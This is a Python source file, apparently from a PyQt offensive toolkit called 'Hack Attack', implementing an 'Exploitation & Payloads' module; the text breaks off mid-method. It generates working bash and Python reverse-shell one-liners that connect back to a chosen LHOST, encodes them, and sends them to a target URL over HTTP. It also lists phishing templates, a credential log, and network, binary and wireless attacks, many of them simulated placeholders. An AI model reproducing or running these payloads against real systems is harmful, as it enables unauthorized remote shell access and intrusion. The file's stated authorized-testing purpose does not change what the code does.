"""
Exploitation & Payloads Module for Hack Attack

This module provides tools for exploitation techniques and payload generation.
It includes features for creating and managing various types of payloads,
as well as auxiliary functions for exploitation.

Note: This tool is intended for authorized security testing only.
"""

import os
import sys
import json
import logging
import hashlib
import base64
import random
import string
import socket
import struct
import subprocess
import platform
import warnings
import requests
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple, Union

# Suppress specific warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=RuntimeWarning)

# Set environment variable to suppress IBus warning
os.environ["QT_LOGGING_RULES"] = "qt.dbus.integration.warning=false"

# Configure logging
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'exploitation.log')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, mode='w'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Import PyQt6 components with error handling for standalone execution
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                QHBoxLayout, QLabel, QPushButton, QFileDialog, 
                                QTextEdit, QGroupBox, QFormLayout, QLineEdit, 
                                QProgressBar, QTabWidget, QTreeWidget, QTreeWidgetItem, 
                                QHeaderView, QSplitter, QStatusBar, QFrame, QComboBox,
                                QListWidget, QTableWidget, QTableWidgetItem, QCheckBox,
                                QMessageBox, QTreeView, QSpinBox, QSizePolicy)
    from PyQt6.QtCore import Qt, QThread, pyqtSignal
    from PyQt6.QtGui import QFileSystemModel
    PYQT6_AVAILABLE = True
except ImportError:
    try:
        from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                   QHBoxLayout, QLabel, QPushButton, QFileDialog, 
                                   QTextEdit, QGroupBox, QFormLayout, QLineEdit, 
                                   QProgressBar, QTabWidget, QTreeWidget, QTreeWidgetItem, 
                                   QHeaderView, QSplitter, QStatusBar, QFrame, QComboBox,
                                   QListWidget, QTableWidget, QTableWidgetItem, QCheckBox,
                                   QMessageBox, QTreeView, QSpinBox, QSizePolicy)
        from PyQt5.QtCore import Qt, QThread, pyqtSignal
        from PyQt5.QtGui import QFileSystemModel
        PYQT6_AVAILABLE = False
    except ImportError:
        PYQT6_AVAILABLE = False
        print("Error: PyQt6 or PyQt5 is required to run this application.")
        sys.exit(1)


# Worker Threads for Background Tasks
class PayloadGeneratorThread(QThread):
    """Thread for generating payloads in the background"""
    finished_signal = pyqtSignal(dict)
    
    def __init__(self, payload_type, lhost, lport, encoding):
        super().__init__()
        self.payload_type = payload_type
        self.lhost = lhost
        self.lport = lport
        self.encoding = encoding
    
    def run(self):
        """Generate the payload"""
        try:
            # Simple payload generation (placeholder)
            if self.payload_type == "reverse_shell_bash":
                payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
            elif self.payload_type == "reverse_shell_python":
                payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
            else:
                payload = "echo 'Unsupported payload type'"
                
            # Apply encoding if needed
            if self.encoding == "base64":
                payload = base64.b64encode(payload.encode()).decode()
            elif self.encoding == "hex":
                payload = payload.encode().hex()
            elif self.encoding == "url":
                payload = quote(payload)
                
            # Return the result
            self.finished_signal.emit({
                'success': True,
                'details': {
                    'payload_type': self.payload_type,
                    'lhost': self.lhost,
                    'lport': self.lport,
                    'encoding': self.encoding,
                    'payload': payload
                }
            })
        except Exception as e:
            self.finished_signal.emit({
                'success': False,
                'error': str(e)
            })


class PayloadSenderThread(QThread):
    """Thread for sending payloads to targets"""
    status_signal = pyqtSignal(str)
    result_signal = pyqtSignal(dict)
    
    def __init__(self, target_url, method, params, payload):
        super().__init__()
        self.target_url = target_url
        self.method = method
        self.params = params
        self.payload = payload
    
    def run(self):
        """Send the payload to the target"""
        try:
            self.status_signal.emit(f"[*] Preparing to send payload via {self.method}...")
            
            # Prepare the request
            params = {}
            if self.params:
                for param in self.params.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value.replace('PAYLOAD', self.payload)
                        
            self.status_signal.emit(f"[*] Sending payload to {self.target_url}...")
            
            # Send the request based on the method
            if self.method == "GET":
                response = requests.get(self.target_url, params=params, timeout=10)
            elif self.method == "POST":
                response = requests.post(self.target_url, data=params, timeout=10)
            else:
                raise ValueError(f"Unsupported HTTP method: {self.method}")
                
            self.status_signal.emit(f"[*] Received response: HTTP {response.status_code}")
            
            # Return the result
            self.result_signal.emit({
                'success': True,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'response': response.text[:500] + ("..." if len(response.text) > 500 else "")
            })
        except Exception as e:
            self.status_signal.emit(f"[-] Error: {str(e)}")
            self.result_signal.emit({
                'success': False,
                'error': str(e)
            })


class SocialEngineeringWorker(QThread):
    """Worker thread for social engineering attacks."""
    credential_received = pyqtSignal(str, str)
    status_update = pyqtSignal(str)
    finished = pyqtSignal()
    
    def __init__(self, attack_name):
        super().__init__()
        self.attack_name = attack_name
        self._is_running = True
    
    def run_attack(self):
        """Run the social engineering attack."""
        try:
            self.status_update.emit(f"[+] Starting {self.attack_name} attack...")
            
            # Simulate attack progress
            for i in range(1, 6):
                if not self._is_running:
                    break
                self.status_update.emit(f"[*] Attack in progress... Step {i}/5")
                self.msleep(1000)  # Simulate work
            
            # Simulate credentials being captured
            if self._is_running and "Credential" in self.attack_name:
                self.credential_received.emit("admin@example.com", "P@ssw0rd123!")
                self.status_update.emit("[+] Captured credentials!")
            
            if self._is_running:
                self.status_update.emit(f"[+] {self.attack_name} completed successfully")
            else:
                self.status_update.emit("[*] Attack was interrupted by user")
                
        except Exception as e:
            self.status_update.emit(f"[-] Error: {str(e)}")
        finally:
            self.finished.emit()
    
    def stop(self):
        """Stop the attack."""
        self._is_running = False


class WirelessScanWorker(QThread):
    """Worker thread for wireless network scanning."""
    scan_complete = pyqtSignal(list)
    error = pyqtSignal(str)
    
    def __init__(self, interface):
        super().__init__()
        self.interface = interface
        self._is_running = True
    
    def run(self):
        """Run the wireless network scan."""
        try:
            # Simulate scanning for networks
            networks = []
            for i in range(5):
                if not self._is_running:
                    return
                networks.append({
                    'bssid': f'00:11:22:33:44:{i:02X}',
                    'essid': f'Network_{i}',
                    'channel': random.randint(1, 11),
                    'encryption': 'WPA2'
                })
                self.msleep(200)  # Simulate work
            
            self.scan_complete.emit(networks)
        except Exception as e:
            self.error.emit(f"Scan error: {str(e)}")
    
    def stop(self):
        """Stop the scan."""
        self._is_running = False


class WirelessAttackWorker(QThread):
    """Worker thread for wireless attacks."""
    update_log = pyqtSignal(str)
    client_found = pyqtSignal(dict)
    attack_complete = pyqtSignal(dict)
    error = pyqtSignal(str)
    
    def __init__(self, attack_name):
        super().__init__()
        self.attack_name = attack_name
        self._is_running = True
    
    def run(self):
        """Run the wireless attack."""
        try:
            self.update_log.emit(f"Starting {self.attack_name}...")
            
            # Simulate attack progress
            for i in range(1, 6):
                if not self._is_running:
                    return
                self.update_log.emit(f"{self.attack_name} in progress... Step {i}/5")
                self.msleep(500)  # Simulate work
            
            # Simulate finding a client (for deauth attacks)
            if "deauth" in self.attack_name.lower():
                self.client_found.emit({
                    'mac': 'AA:BB:CC:DD:EE:FF',
                    'vendor': 'Vendor',
                    'signal': '-45',
                    'packets': '10',
                    'last_seen': datetime.now().strftime('%H:%M:%S')
                })
            
            self.attack_complete.emit({
                'success': True,
                'message': f"{self.attack_name} completed successfully"
            })
        except Exception as e:
            self.error.emit(f"Attack error: {str(e)}")
    
    def stop(self):
        """Stop the attack."""
        self._is_running = False


class ExploitationModule:
    """
    Exploitation & Payloads module for Hack Attack
    
    Provides tools for generating and managing exploitation payloads
    """
    
    def __init__(self, parent=None):
        """
        Initialize the exploitation module
        
        Args:
            parent: Parent widget (if any)
        """
        self.parent = parent
        self.logger = logging.getLogger(__name__)
        self.logger.info("ExploitationModule initialized")
    
    def get_name(self) -> str:
        """
        Return the display name of the module.
        
        Returns:
            str: The display name
        """
        return "Exploitation & Payloads"
    
    def get_description(self) -> str:
        """
        Return a brief description of the module.
        
        Returns:
            str: The module description
        """
        return "Tools for exploitation techniques and payload generation"
    
    def get_icon(self):
        """
        Return the icon for this module.
        
        Returns:
            QIcon or None: The icon for this module
        """
        return None
    
    def get_widget(self, parent=None):
        """
        Return the main widget for this module.
        
        Args:
            parent: Parent widget (if any)
            
        Returns:
            QWidget: The main widget for this module
        """
        if not PYQT6_AVAILABLE:
            return QLabel("GUI dependencies not available. Please install PyQt6 or PyQt5.")
            
        return ExploitationGUI(parent=parent)

class ExploitationGUI(QWidget):
    """
    Exploitation & Payloads module GUI
    
    Provides a user interface for the exploitation tools
    """
    
    def __init__(self, parent=None):
        """
        Initialize the exploitation GUI
        
        Args:
            parent: Parent widget (if any)
        """
        super().__init__(parent)
        
        # Set widget properties
        if hasattr(QSizePolicy.Policy, 'Expanding'):
            # PyQt6 style
            self.setSizePolicy(QSizePolicy.Policy.Expanding, 
                            QSizePolicy.Policy.Expanding)
        else:
            # PyQt5 style
            self.setSizePolicy(QSizePolicy.Expanding, 
                            QSizePolicy.Expanding)
        
        # Initialize all properties before building the UI
        self.initialize_properties()
        
        # Initialize the UI
        self.init_ui()
        
        # Apply the Hack Attack theme
        self.apply_styles()
    
    def apply_styles(self):
        """Apply consistent styling to the UI."""
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e2e;
                color: #cdd6f4;
            }
            QTreeWidget, QTableWidget, QListWidget {
                background-color: #181825;
                border: none;
                font-size: 13px;
                padding: 10px;
                outline: none;
                gridline-color: #313244;
                color: #cdd6f4;
            }
            QHeaderView::section {
                background-color: #313244;
                color: #cdd6f4;
                padding: 5px;
                border: none;
                font-weight: bold;
            }
            QTabWidget::pane {
                border: 1px solid #45475a;
                background: #1e1e2e;
            }
            QTabBar::tab {
                background: #313244;
                color: #cdd6f4;
                padding: 8px 15px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background: #89b4fa;
                color: #1e1e2e;
            }
            QPushButton {
                background-color: #89b4fa;
                color: #1e1e2e;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
                min-width: 120px;
            }
            QPushButton:disabled {
                background-color: #45475a;
                color: #6c7086;
            }
            QPushButton:hover {
                background-color: #74c7ec;
            }
            QLineEdit, QComboBox, QSpinBox, QTextEdit, QPlainTextEdit {
                background-color: #313244;
                border: 1px solid #45475a;
                border-radius: 4px;
                padding: 5px;
                color: #cdd6f4;
                min-height: 25px;
            }
            QProgressBar {
                border: 1px solid #45475a;
                border-radius: 4px;
                text-align: center;
                background: #1e1e2e;
                color: #cdd6f4;
            }
            QLabel {
                color: #cdd6f4;
            }
            QGroupBox {
                border: 1px solid #45475a;
                border-radius: 4px;
                margin-top: 1em;
                padding-top: 10px;
                color: #cdd6f4;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
                color: #89b4fa;
            }
            QScrollBar:vertical {
                border: none;
                background: #1e1e2e;
                width: 10px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #45475a;
                min-height: 20px;
                border-radius: 5px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
            QScrollBar:horizontal {
                border: none;
                background: #1e1e2e;
                height: 10px;
                margin: 0px;
            }
            QScrollBar::handle:horizontal {
                background: #45475a;
                min-width: 20px;
                border-radius: 5px;
            }
            QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
                width: 0px;
            }
        """)

    def initialize_properties(self):
        """Initialize class properties"""
        # Store the full list of attacks/exploits for filtering
        self.all_social_attacks = [
            "Phishing Email",
            "Credential Harvesting",
            "Malicious USB",
            "QR Code Attack",
            "Phone Call Spoofing",
            "SMS Phishing",
            "Social Media Impersonation",
            "Physical Access Attacks"
        ]
        self.social_attacks = self.all_social_attacks.copy()
        
        self.all_binary_exploits = [
            "Buffer Overflow",
            "Format String",
            "ROP Chain Generator",
            "Shellcode Generator",
            "ASLR Bypass",
            "DEP/ASLR Bypass",
            "Use-After-Free",
            "Heap Exploitation",
            "Integer Overflow",
            "Race Conditions"
        ]
        self.binary_exploits = self.all_binary_exploits.copy()
        
        self.all_network_exploits = [
            "Port Scanner",
            "Service Fingerprinting",
            "Man-in-the-Middle",
            "ARP Spoofing",
            "DNS Spoofing",
            "DHCP Starvation",
            "VLAN Hopping",
            "SNMP Exploits",
            "SMB Exploits",
            "RDP Exploits"
        ]
        self.network_exploits = self.all_network_exploits.copy()
        
        self.wireless_attacks = [
            "WiFi Deauth Attack",
            "WPA Handshake Capture",
            "WPS PIN Attack",
            "Evil Twin",
            "Karma Attack",
            "Bluetooth Recon",
            "Bluetooth SPP Exploit",
            "RFID Cloning",
            "NFC Eavesdropping"
        ]
        
        # Initialize objects for tab references
        self.post_options_group = None
        self.exploit_output = None
        self.wireless_options_layout = None
        self.wireless_target_layout = None
        self.wireless_results = None
        self.packet_view = None
        self.social_options_layout = None
        self.social_results = None
        self.credential_log = None
        self.binary_options_layout = None
        self.binary_results = None
        self.disasm_view = None
        self.memory_view = None
        self.network_options_layout = None
        self.network_results = None
        self.options_layout = None
        self.results = None
        
    def init_ui(self):
        """Initialize the user interface"""
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Create tab widget
        self.tabs = QTabWidget()
        
        # Create tabs
        self.tab_payload = self.create_payload_tab()
        self.tab_web = self.create_exploits_tab()
        self.tab_network = self.create_network_tab()
        self.tab_binary = self.create_binary_tab()
        self.tab_social = self.create_social_tab()
        self.tab_wireless = self.create_wireless_tab()
        self.tab_post = self.create_post_tab()
        
        # Add tabs to tab widget
        self.tabs.addTab(self.tab_payload, "Payload Generator")
        self.tabs.addTab(self.tab_web, "Web Exploits")
        self.tabs.addTab(self.tab_network, "Network")
        self.tabs.addTab(self.tab_binary, "Binary")
        self.tabs.addTab(self.tab_social, "Social Engineering")
        self.tabs.addTab(self.tab_wireless, "Wireless")
        self.tabs.addTab(self.tab_post, "Post-Exploitation")
        
        # Add tabs to the main layout
        self.main_layout.addWidget(self.tabs)
    
    def create_payload_tab(self):
        """Create the Payload Generator tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Payload type selection
        type_group = QGroupBox("Payload Settings")
        type_layout = QFormLayout()
        
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "reverse_shell_bash",
            "reverse_shell_python"
        ])
    
        # Payload parameters
        self.lhost = QLineEdit("192.168.1.100")
        self.lport = QLineEdit("4444")
        self.encoding = QComboBox()
        self.encoding.addItems(["none", "base64", "hex", "url"])
    
        # Add widgets to form
        type_layout.addRow("Payload Type:", self.payload_type)
        type_layout.addRow("LHOST:", self.lhost)
        type_layout.addRow("LPORT:", self.lport)
        type_layout.addRow("Encoding:", self.encoding)
        type_group.setLayout(type_layout)
    
        # Delivery method
        delivery_group = QGroupBox("Delivery Method")
        delivery_layout = QFormLayout()
    
        self.delivery_method = QComboBox()
        self.delivery_method.addItems(["Manual Copy", "HTTP Request"])
        self.delivery_method.currentTextChanged.connect(self.toggle_delivery_method)
    
        self.target_url = QLineEdit()
        self.target_url.setPlaceholderText("http://target.com/vulnerable/endpoint")
        self.target_url.setVisible(False)
    
        self.http_method = QComboBox()
        self.http_method.addItems(["GET", "POST"])
        self.http_method.setVisible(False)
    
        self.http_params = QLineEdit()
        self.http_params.setPlaceholderText("param1=value1&param2=PAYLOAD")
        self.http_params.setVisible(False)
    
        delivery_layout.addRow("Method:", self.delivery_method)
        delivery_layout.addRow("Target URL:", self.target_url)
        delivery_layout.addRow("HTTP Method:", self.http_method)
        delivery_layout.addRow("Parameters:", self.http_params)
        delivery_group.setLayout(delivery_layout)
    
        # Buttons
        btn_layout = QHBoxLayout()
    
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
    
        self.send_btn = QPushButton("Send Payload")
        self.send_btn.setEnabled(False)
        self.send_btn.clicked.connect(self.send_payload)
    
        btn_layout.addWidget(self.generate_btn)
        btn_layout.addWidget(self.send_btn)
    
        # Output area
        output_group = QGroupBox("Generated Payload")
        output_layout = QVBoxLayout()
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        output_layout.addWidget(self.output)
        output_group.setLayout(output_layout)
    
        # Status area
        self.status_area = QTextEdit()
        self.status_area.setReadOnly(True)
        self.status_area.setMaximumHeight(100)
        self.status_area.setStyleSheet("background-color: #1e1e1e; color: #00ff00;")
    
        # Add all sections to main layout
        layout.addWidget(type_group)
        layout.addWidget(delivery_group)
        layout.addLayout(btn_layout)
        layout.addWidget(output_group, 1)  # Give more space to output
        layout.addWidget(self.status_area)
    
        return tab

    def create_exploits_tab(self):
        """Create the Web Exploits tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for exploit list and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Exploit list
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Exploit selection
        exploit_group = QGroupBox("Available Exploits")
        exploit_layout = QVBoxLayout()
        
        self.exploit_list = QListWidget()
        self.exploit_list.addItems([
            "SQL Injection",
            "Cross-Site Scripting (XSS)",
            "Command Injection",
            "File Inclusion",
            "Server-Side Request Forgery (SSRF)",
            "XML External Entity (XXE)",
            "Deserialization"
        ])
        self.exploit_list.currentItemChanged.connect(self.on_exploit_selected)
        
        exploit_layout.addWidget(self.exploit_list)
        exploit_group.setLayout(exploit_layout)
        left_layout.addWidget(exploit_group)
        
        # Right panel - Exploit details and controls
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Target configuration
        self.target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.target_url = QLineEdit()
        self.target_url.setPlaceholderText("http://example.com/vulnerable/endpoint")
        
        self.target_method = QComboBox()
        self.target_method.addItems(["GET", "POST", "PUT", "DELETE"])
        
        self.target_params = QTextEdit()
        self.target_params.setPlaceholderText("param1=value1\nparam2=value2")
        self.target_params.setMaximumHeight(100)
        
        target_layout.addRow("Target URL:", self.target_url)
        target_layout.addRow("HTTP Method:", self.target_method)
        target_layout.addRow("Parameters:", self.target_params)
        self.target_group.setLayout(target_layout)
        
        # Exploit specific options
        self.options_group = QGroupBox("Exploit Options")
        self.options_layout = QFormLayout()
        self.options_group.setLayout(self.options_layout)
        
        # Results area
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        
        self.exploit_output = QTextEdit()  # Create the exploit_output widget
        self.exploit_output.setReadOnly(True)
        self.exploit_output.append("Select an exploit from the list to begin.")
        
        self.results = QTextEdit()
        self.results.setReadOnly(True)
        
        results_layout.addWidget(self.exploit_output)  # Add exploit_output to layout
        results_layout.addWidget(self.results)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.test_btn = QPushButton("Test")
        self.test_btn.clicked.connect(self.test_exploit)
        
        self.execute_btn = QPushButton("Execute")
        self.execute_btn.clicked.connect(self.execute_exploit)
        self.execute_btn.setEnabled(False)
        
        control_layout.addWidget(self.test_btn)
        control_layout.addWidget(self.execute_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.target_group)
        right_layout.addWidget(self.options_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Select first exploit by default
        if self.exploit_list.count() > 0:
            self.exploit_list.setCurrentRow(0)
        
        return tab
    
    def create_network_tab(self):
        """Create the Network Exploits tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for exploit list and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Exploit list
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Search box
        self.network_search = QLineEdit()
        self.network_search.setPlaceholderText("Search network exploits...")
        self.network_search.textChanged.connect(self.filter_network_exploits)
        
        # Exploit selection
        exploit_group = QGroupBox("Network Exploits")
        exploit_layout = QVBoxLayout()
        
        self.network_exploit_list = QListWidget()
        self.network_exploit_list.addItems(self.network_exploits)
        self.network_exploit_list.currentItemChanged.connect(self.on_network_exploit_selected)
        
        exploit_layout.addWidget(self.network_search)
        exploit_layout.addWidget(self.network_exploit_list)
        exploit_group.setLayout(exploit_layout)
        left_layout.addWidget(exploit_group)
        
        # Right panel - Exploit details and controls
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Target configuration
        self.network_target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.network_target = QLineEdit()
        self.network_target.setPlaceholderText("192.168.1.1 or 192.168.1.0/24")
        
        self.network_ports = QLineEdit()
        self.network_ports.setPlaceholderText("80,443,8080 or 1-1024")
        
        self.network_interface = QComboBox()
        self.network_interface.addItem("Auto-detect")
        
        target_layout.addRow("Target:", self.network_target)
        target_layout.addRow("Ports:", self.network_ports)
        target_layout.addRow("Interface:", self.network_interface)
        self.network_target_group.setLayout(target_layout)
        
        # Exploit specific options
        self.network_options_group = QGroupBox("Exploit Options")
        self.network_options_layout = QFormLayout()
        self.network_options_group.setLayout(self.network_options_layout)
        
        # Results area
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        
        self.network_results = QTextEdit()
        self.network_results.setReadOnly(True)
        self.network_results.append("Select a network exploit from the list to begin.")
        
        results_layout.addWidget(self.network_results)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.network_scan_btn = QPushButton("Scan")
        self.network_scan_btn.clicked.connect(self.scan_network)
        
        self.network_exploit_btn = QPushButton("Exploit")
        self.network_exploit_btn.clicked.connect(self.execute_network_exploit)
        self.network_exploit_btn.setEnabled(False)
        
        control_layout.addWidget(self.network_scan_btn)
        control_layout.addWidget(self.network_exploit_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.network_target_group)
        right_layout.addWidget(self.network_options_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Populate network interfaces
        self.populate_network_interfaces()
        
        # Select first exploit by default
        if self.network_exploit_list.count() > 0:
            self.network_exploit_list.setCurrentRow(0)
        
        return tab
    
    def create_binary_tab(self):
        """Create the Binary Exploits tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for exploit list and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Exploit list
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Search box
        self.binary_search = QLineEdit()
        self.binary_search.setPlaceholderText("Search binary exploits...")
        self.binary_search.textChanged.connect(self.filter_binary_exploits)
        
        # Exploit selection
        exploit_group = QGroupBox("Binary Exploits")
        exploit_layout = QVBoxLayout()
        
        self.binary_exploit_list = QListWidget()
        self.binary_exploit_list.addItems(self.binary_exploits)
        self.binary_exploit_list.currentItemChanged.connect(self.on_binary_exploit_selected)
        
        exploit_layout.addWidget(self.binary_search)
        exploit_layout.addWidget(self.binary_exploit_list)
        exploit_group.setLayout(exploit_layout)
        left_layout.addWidget(exploit_group)
        
        # Right panel - Exploit details and controls
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Target configuration
        self.binary_target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.binary_target = QLineEdit()
        self.binary_target.setPlaceholderText("/path/to/binary or PID")
        
        self.binary_arch = QComboBox()
        self.binary_arch.addItems(["x86", "x86-64", "ARM", "ARM64", "MIPS", "PowerPC"])
        
        target_layout.addRow("Target:", self.binary_target)
        target_layout.addRow("Architecture:", self.binary_arch)
        self.binary_target_group.setLayout(target_layout)
        
        # Exploit specific options
        self.binary_options_group = QGroupBox("Exploit Options")
        self.binary_options_layout = QFormLayout()
        self.binary_options_group.setLayout(self.binary_options_layout)
        
        # Results area
        results_group = QGroupBox("Exploit Results")
        results_layout = QVBoxLayout()
        
        self.binary_results = QTextEdit()
        self.binary_results.setReadOnly(True)
        self.binary_results.append("Select a binary exploit from the list to begin.")
        
        # Disassembly view
        self.disasm_view = QTextEdit()
        self.disasm_view.setReadOnly(True)
        self.disasm_view.setMaximumHeight(150)
        self.disasm_view.setStyleSheet("font-family: 'Courier New'; font-size: 10pt;")
        
        # Memory dump view
        self.memory_view = QTextEdit()
        self.memory_view.setReadOnly(True)
        self.memory_view.setMaximumHeight(100)
        self.memory_view.setStyleSheet("font-family: 'Courier New'; font-size: 10pt;")
        
        results_layout.addWidget(QLabel("Disassembly:"))
        results_layout.addWidget(self.disasm_view)
        results_layout.addWidget(QLabel("Memory Dump:"))
        results_layout.addWidget(self.memory_view)
        results_layout.addWidget(QLabel("Exploit Output:"))
        results_layout.addWidget(self.binary_results)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.binary_analyze_btn = QPushButton("Analyze")
        self.binary_analyze_btn.clicked.connect(self.analyze_binary)
        
        self.binary_exploit_btn = QPushButton("Exploit")
        self.binary_exploit_btn.clicked.connect(self.execute_binary_exploit)
        self.binary_exploit_btn.setEnabled(False)
        
        control_layout.addWidget(self.binary_analyze_btn)
        control_layout.addWidget(self.binary_exploit_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.binary_target_group)
        right_layout.addWidget(self.binary_options_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Select first exploit by default
        if self.binary_exploit_list.count() > 0:
            self.binary_exploit_list.setCurrentRow(0)
        
        return tab

    def create_social_tab(self):
        """Create the Social Engineering tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for attack selection and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Attack selection
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Search box
        self.social_search = QLineEdit()
        self.social_search.setPlaceholderText("Search social engineering attacks...")
        self.social_search.textChanged.connect(self.filter_social_attacks)
        
        # Attack selection
        attack_group = QGroupBox("Attack Types")
        attack_layout = QVBoxLayout()
        
        self.social_attack_list = QListWidget()
        self.social_attack_list.addItems(self.social_attacks)
        self.social_attack_list.currentItemChanged.connect(self.on_social_attack_selected)
        
        attack_layout.addWidget(self.social_search)
        attack_layout.addWidget(self.social_attack_list)
        attack_group.setLayout(attack_layout)
        left_layout.addWidget(attack_group)
        
        # Right panel - Attack configuration and results
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Target configuration
        self.social_target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.social_target_email = QLineEdit()
        self.social_target_email.setPlaceholderText("target@example.com")
        
        self.social_sender_email = QLineEdit()
        self.social_sender_email.setPlaceholderText("trusted@company.com")
        
        self.social_subject = QLineEdit()
        self.social_subject.setPlaceholderText("Important: Action Required")
        
        target_layout.addRow("Target Email:", self.social_target_email)
        target_layout.addRow("Sender Email:", self.social_sender_email)
        target_layout.addRow("Subject:", self.social_subject)
        self.social_target_group.setLayout(target_layout)
        
        # Attack specific options
        self.social_options_group = QGroupBox("Attack Options")
        self.social_options_layout = QVBoxLayout()
        self.social_options_group.setLayout(self.social_options_layout)
        
        # Template selection
        self.template_group = QGroupBox("Templates")
        template_layout = QVBoxLayout()
        
        self.template_list = QListWidget()
        self.template_list.addItems(["Password Reset", "Account Verification", "Document Share", "Invoice"])
        self.template_list.currentItemChanged.connect(self.on_template_selected)
        
        self.template_preview = QTextEdit()
        self.template_preview.setReadOnly(True)
        self.template_preview.setMaximumHeight(200)
        
        template_layout.addWidget(QLabel("Select Template:"))
        template_layout.addWidget(self.template_list)
        template_layout.addWidget(QLabel("Preview:"))
        template_layout.addWidget(self.template_preview)
        self.template_group.setLayout(template_layout)
        
        # Results area
        results_group = QGroupBox("Attack Results")
        results_layout = QVBoxLayout()
        
        self.social_results = QTextEdit()
        self.social_results.setReadOnly(True)
        self.social_results.append("Select a social engineering attack from the list to begin.")
        
        # Credential log
        self.credential_log = QTableWidget(0, 3)
        self.credential_log.setHorizontalHeaderLabels(["Timestamp", "Username", "Password"])
        header = self.credential_log.horizontalHeader()
        if hasattr(QHeaderView, 'ResizeMode'):  # PyQt6
            header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        else:  # PyQt5
            header.setSectionResizeMode(QHeaderView.Stretch)
        self.credential_log.setMaximumHeight(200)
        
        results_layout.addWidget(QLabel("Attack Log:"))
